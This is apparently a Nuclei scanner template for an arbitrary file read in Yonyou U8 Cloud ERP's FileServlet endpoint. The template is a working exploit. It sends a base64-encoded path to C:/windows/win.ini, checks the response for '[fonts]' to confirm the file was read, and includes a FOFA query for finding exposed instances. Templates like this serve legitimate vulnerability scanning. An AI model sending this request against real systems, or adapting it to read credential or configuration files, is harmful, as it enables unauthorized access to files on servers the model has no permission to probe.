id: yonyou-u8c-fileservlet-fileread

info:
  name: 用友-U8C-FileServlet-文件读取
  author: Abbbbb
  severity: high
  metadata:
    fofa-query: app="用友-U8-Cloud" || body="/api/uclient/public/"

http:
  - raw:
      - |-
        GET /service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ== HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body, "[fonts]")'